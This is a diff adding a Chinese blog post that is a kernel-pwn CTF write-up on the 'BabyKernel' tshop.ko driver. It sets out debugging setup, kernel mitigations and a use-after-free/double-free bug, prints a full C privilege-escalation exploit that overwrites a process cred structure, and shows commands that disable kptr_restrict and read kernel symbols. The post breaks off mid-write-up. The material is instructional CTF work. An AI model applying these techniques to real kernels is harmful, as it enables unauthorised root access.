@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="P1umer sauce">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="P1umer sauce">
+    
+    <meta name="keywords" content="Blog">
+    
+    <meta name="description" content="noman">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>[KERNEL] Linux Kernel 初探（一）BabyKernel · P1umerのStudio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >P1umerのStudio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">[KERNEL] Linux Kernel 初探（一）BabyKernel</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>P1umerのStudio.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            [KERNEL] Linux Kernel 初探（一）BabyKernel
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "kernel">kernel</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2,618</span>阅读时长: <span class="post-count reading-time">12 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/05/14</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="KERNEL-Linux-Kernel-初探（一）BabyKernel"><a href="#KERNEL-Linux-Kernel-初探（一）BabyKernel" class="headerlink" title="[KERNEL]  Linux Kernel 初探（一）BabyKernel"></a>[KERNEL]  Linux Kernel 初探（一）BabyKernel</h2><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>这篇博客是记录我入门Linux kernel的心得和体会，一直以来对内核知识都较为感兴趣，下面就开始第一个 kernel pwn 的旅程 :)</p>
+<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>【+】 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge/</a><br>【+】 <a href="http://p4nda.top" target="_blank" rel="noopener">http://p4nda.top</a><br>【+】 <a href="https://sunichi.github.io" target="_blank" rel="noopener">https://sunichi.github.io</a></p>
+<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>【+】题目链接：<a href="https://drive.google.com/file/d/1B5EKTB3c2sYHg26f_tvxejrP0HFzj1Qi/view?usp=sharing" target="_blank" rel="noopener">https://drive.google.com/file/d/1B5EKTB3c2sYHg26f_tvxejrP0HFzj1Qi/view?usp=sharing</a><br>解压题目我们可以拿到以下文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p1umer@ubuntu:~/kernel/give_to_player$ ls -l</span><br><span class="line">total 5516</span><br><span class="line">-rwxr-xr-x 1 p1umer p1umer     202 May  9 00:09 boot.sh</span><br><span class="line">-rw-r--r-- 1 p1umer p1umer 4127776 May  9 00:09 bzImage</span><br><span class="line">-rw-r--r-- 1 p1umer p1umer 1514482 May  9 04:35 initramfs.img</span><br></pre></td></tr></table></figure></p>
+<p>将initramfs.img后缀改为.cpio后用ubuntu再次解压可以得到如下文件：<br><img src="https://github.com/P1umer/P1umer.github.io/blob/master/images/2.png?raw=true" alt=""></p>
+<p>在poc文件夹内找到tshop.ko文件，使用IDA分析：<br><img src="https://github.com/P1umer/P1umer.github.io/blob/master/images/3.png?raw=true" alt=""></p>
+<p>其中可以观察到，主要函数有三个：</p>
+<ul>
+<li>tshop-ioctl</li>
+<li>tshop-init</li>
+<li>tshop-exit</li>
+</ul>
+<p>其中核心函数是 tshop-ioctl 需要重点分析，我们后面会具体分析这个函数</p>
+<h3 id="调试以及数据交互"><a href="#调试以及数据交互" class="headerlink" title="调试以及数据交互"></a>调试以及数据交互</h3><h4 id="程序启动以及调试"><a href="#程序启动以及调试" class="headerlink" title="程序启动以及调试"></a>程序启动以及调试</h4><p>题目包含了一个 qemu 的启动脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -nographic \</span><br><span class="line">    -append &quot;rdinit=/linuxrc console=ttyS0 oops=panic panic=1&quot; \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -cpu qemu64,smap,smep -initrd initramfs.img \</span><br><span class="line">    -smp cores=1,threads=1 2&gt;/dev/null \</span><br></pre></td></tr></table></figure></p>
+<p>可以看到其中如果选择开启kaslr则需要在 -append 选项后面加上kaslr即可<br>如果选择gdb调试，则需要加上：<code>-gdb tcp::4869 -S</code> （其中-S为挂起等待），对应的gdb脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb \</span><br><span class="line">    -ex &quot;add-auto-load-safe-path $(pwd)&quot; \</span><br><span class="line">    -ex &quot;file vmlinux&quot; \</span><br><span class="line">    -ex &apos;set arch i386:x86-64:intel&apos; \</span><br><span class="line">    -ex &apos;target remote localhost:4869&apos; \</span><br><span class="line">    -ex &apos;continue&apos; \</span><br><span class="line">    -ex &apos;disconnect&apos; \</span><br><span class="line">    -ex &apos;set arch i386:x86-64&apos; \</span><br><span class="line">    -ex &apos;target remote localhost:4869&apos;</span><br></pre></td></tr></table></figure></p>
+<h4 id="EXP编写以及数据交互"><a href="#EXP编写以及数据交互" class="headerlink" title="EXP编写以及数据交互"></a>EXP编写以及数据交互</h4><p>Kernel Pwn 如何和驱动模块进行交互呢？</p>
+<p>驱动处理预期流程是：</p>
+<ul>
+<li>用户态调用驱动触发状态切换</li>
+<li>进入内核态内核态响应用户请求</li>
+<li>处理数据返回结果</li>
+<li>切换回用户态</li>
+</ul>
+<p>那么如何在用户态调用驱动呢？</p>
+<p>首先，对一个字符设备而言有如下结构体：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct file_operations d_fops = &#123;</span><br><span class="line">	.owner = THIS_MODULE,</span><br><span class="line">	.open = d_open,</span><br><span class="line">	.read = d_read,</span><br><span class="line">	.write = d_write,</span><br><span class="line">	.ioctl = d_ioctl,</span><br><span class="line">	.release = d_release,</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>该结构体展示了部分文件操作对应的函数指针。如读该设备时会调用d_open函数。从该结构体我们可以看出其实现了用户与内核驱动交互的接口，同时也就自然成为了内核攻击面之一。具体的调用方法为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char *argv[])&#123;</span><br><span class="line">    int fd = open(&quot;/dev/tshop&quot;,0);</span><br><span class="line">    //debug();</span><br><span class="line">    ioctl(fd,MALLOC,0);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>fd打开设备</li>
+<li>通过ioctl进行具体的交互（或者该驱动注册的其他处理函数）</li>
+</ul>
+<p>好了，可以实现和驱动模块的交互后，我们就可以用c语言来编写相应的exploit了。但是在这之前，我们先了解一下内核的一些保护模式</p>
+<h3 id="缓释机制"><a href="#缓释机制" class="headerlink" title="缓释机制"></a>缓释机制</h3><h4 id="mmap-min-addr"><a href="#mmap-min-addr" class="headerlink" title="mmap_min_addr"></a>mmap_min_addr</h4><p>指定用户进程通过mmap可使用的最小虚拟内存地址，以避免其在低地址空间产生映射导致安全问题。</p>
+<h4 id="kptr-restrict-dmesg-restrict"><a href="#kptr-restrict-dmesg-restrict" class="headerlink" title="kptr_restrict / dmesg_restrict"></a>kptr_restrict / dmesg_restrict</h4><p>在linux内核漏洞利用中常常使用commit_creds和prepare_kernel_cred来完成提权，它们的地址可以从/proc/kallsyms中读取。/proc/sys/kernel/kptr_restrict被默认设置为1以阻止通过这种方式泄露内核地址。dmesg_restrict限制非特权读dmesg（Restrict unprivileged access to kernel syslog）</p>
+<h4 id="SMEP-SMAP"><a href="#SMEP-SMAP" class="headerlink" title="SMEP/SMAP"></a>SMEP/SMAP</h4><p>SMEP(Supervisor Mode Execution Prevention，管理模式执行保护)和SMAP(Supervisor Mode Access Prevention，管理模式访问保护)，其作用分别是禁止内核执行用户空间的代码和禁止内核访问用户空间的数据。</p>
+<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>前面提到，ida打开.ko文件得到如下内容：<br><img src="https://github.com/P1umer/P1umer.github.io/blob/master/images/4.png?raw=true" alt=""><br>可以得到如下信息：</p>
+<ul>
+<li>程序实现了kmalloc；kfree；edit1；edit2</li>
+<li>程序维护了一个BUY_LIST用来存放kmen_cache_alloc分配的堆块</li>
+<li>malloc的时候会把堆块写成特定值</li>
+<li>两个edit函数改指针为固定值</li>
+<li>有一个看起来没有参数的 kfree</li>
+</ul>
+<p>等等，kfree没有参数？让我们仔细分析它：<br><img src="https://github.com/P1umer/P1umer.github.io/blob/master/images/5.png?raw=true" alt=""><br>嗯，参数还是有的。但是这里面在释放完毕BUY_LIST里的堆块之后并没有清空，也就是说我们得到了一个UAF!</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>有了一个UAF，那么接下来的事情就好办多了，在这之前先了解一下kernel里面的memory_management：</p>
+<p>【+】<a href="http://www.wowotech.net/memory_management/247.html" target="_blank" rel="noopener">http://www.wowotech.net/memory_management/247.html</a></p>
+<p>其中，若要达到提权权限，则需要修改权限信息。kernel记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个cred结构，这个结构保存了该进程的权限等信息（uid，gid等），如果能修改某个进程的cred，那么也就修改了这个进程的权限。</p>
+<p>特别的，如果free链表内的chunk大小和该内核版本的 cred 结构体大小相同，那么会把free链表中的chunk解链返回给 cred。而且slab分配器的管理手段类似于 Glibc 中的 FastbinY</p>
+<p>于是我们就可以通过doublefree来进行提权：</p>
+<ul>
+<li>doublefree</li>
+<li>得到cred结构体后通过两次malloc修改cred结构体中的值为特定的值（上面的ida分析有提到），恰好可以达到 root 要求</li>
+</ul>
+<p>这个地方遇到了一点困难：由于驱动的堆内存和内核的内存是共享的，在得到 cred 的同时会把cred的信息写入该内存，也就是说</p>
+<ul>
+<li>在我们准备doublefree之前：<br><img src="https://github.com/P1umer/P1umer.github.io/blob/master/images/6.png?raw=true" alt=""></li>
+<li>把cred写入最末尾的chunk<br><img src="https://github.com/P1umer/P1umer.github.io/blob/master/images/7.png?raw=true" alt=""></li>
+</ul>
+<p>内核下一次申请的时候就会申请到非法地址，PANIC!<br>但是如果我们在系统申请非法地址之前讲free链表扩充到足够大是不是就可以缓解呢系统迟一点申请到非法地址呢? 我们来试一试：<br>编写exp.c:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * main.c</span><br><span class="line"> * Copyright (C) 2019 hzshang &lt;hzshang15@gmail.com&gt;</span><br><span class="line"> *</span><br><span class="line"> * Distributed under terms of the MIT license.</span><br><span class="line"> */</span><br><span class="line">// gcc exp.c -o exp --static -lpthread</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;linux/userfaultfd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;linux/prctl.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define MALLOC 0x271A</span><br><span class="line">#define FREE   0x2766</span><br><span class="line">#define EDIT1  0x1A0A</span><br><span class="line">#define EDIT2  0x22B8 </span><br><span class="line">pid_t pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void debug()&#123;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])&#123;</span><br><span class="line">    int fd = open(&quot;/dev/tshop&quot;,0);</span><br><span class="line">    debug();</span><br><span class="line">    ioctl(fd,MALLOC,0);</span><br><span class="line">    ioctl(fd,MALLOC,1);</span><br><span class="line">    ioctl(fd,MALLOC,2);</span><br><span class="line">    ioctl(fd,MALLOC,3);</span><br><span class="line">    ioctl(fd,MALLOC,4);</span><br><span class="line">    ioctl(fd,MALLOC,5);</span><br><span class="line">    ioctl(fd,MALLOC,6);</span><br><span class="line">    ioctl(fd,MALLOC,7);</span><br><span class="line">    ioctl(fd,MALLOC,8);</span><br><span class="line">    ioctl(fd,MALLOC,9);</span><br><span class="line">    ioctl(fd,MALLOC,10);</span><br><span class="line">    ioctl(fd,MALLOC,11);</span><br><span class="line">    ioctl(fd,MALLOC,12);</span><br><span class="line">    ioctl(fd,MALLOC,13);</span><br><span class="line">    ioctl(fd,MALLOC,14);</span><br><span class="line">    ioctl(fd,MALLOC,15);</span><br><span class="line"></span><br><span class="line">    ioctl(fd,MALLOC,16);</span><br><span class="line">    ioctl(fd,MALLOC,17);</span><br><span class="line">    </span><br><span class="line">    ioctl(fd,FREE,17);</span><br><span class="line">    ioctl(fd,FREE,16);</span><br><span class="line">    ioctl(fd,FREE,17);</span><br><span class="line"></span><br><span class="line">    pid=fork();</span><br><span class="line">    if(pid==0)&#123;</span><br><span class="line">        printf(&quot;[+] root?&quot;);</span><br><span class="line">        system(&quot;whoami&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">            ioctl(fd,MALLOC,16);</span><br><span class="line">            ioctl(fd,MALLOC,17);//cred==0 </span><br><span class="line"></span><br><span class="line">            ioctl(fd,FREE,0);</span><br><span class="line">            ioctl(fd,FREE,1);</span><br><span class="line">            ioctl(fd,FREE,2);</span><br><span class="line">            ioctl(fd,FREE,3);</span><br><span class="line">            ioctl(fd,FREE,4);</span><br><span class="line">            ioctl(fd,FREE,5);</span><br><span class="line">            ioctl(fd,FREE,6);</span><br><span class="line">            ioctl(fd,FREE,7);</span><br><span class="line">            ioctl(fd,FREE,8);</span><br><span class="line">            ioctl(fd,FREE,9);</span><br><span class="line">            ioctl(fd,FREE,10);</span><br><span class="line">            ioctl(fd,FREE,11);</span><br><span class="line">            ioctl(fd,FREE,12);</span><br><span class="line">            ioctl(fd,FREE,13);</span><br><span class="line">            ioctl(fd,FREE,14);</span><br><span class="line">            ioctl(fd,FREE,15);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>【编译】：<code>gcc exp.c -o exp --static -lpthread</code><br>注意,由于系统开启了kptr_restrict无法看到一些地址信息，所以我们需要关闭。<br>【关闭 kptr_restrict】：修改解压后的 /etc/.init/rcS 文件中的<br><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code> 为 <code>echo 0 &gt; /proc/sys/kernel/kptr_restrict</code><br>【打包】：打包命令为：<code>find . | cpio -o --format=newc &gt; ../initramfs.img</code><br>启动qemu时候查看一些地址信息：<br>【kmem_cache_alloc】：<code>cat /proc/kallsyms |grep kmem_cache_alloc</code><br>【kfree】：<code>cat /proc/kallsyms |grep kfree</code><br>【tshop的bss地址】：<code>cat /sys/module/tshop/sections/.bss</code></p>
+<p>有了这些信息，我们就可以在gdb中下断，然后exp执行的时候依靠getchar()再main开始中断程序来进行具体的调试。</p>
+<p>输出结果：<br><img src="https://github.com/P1umer/P1umer.github.io/blob/master/images/8.png?raw=true" alt=""></p>
+<p>貌似已经提权成功了。这种方法确实奏效，但是当我多执行一些指令的时候内核又会panic :(<br>怎么办呢？</p>
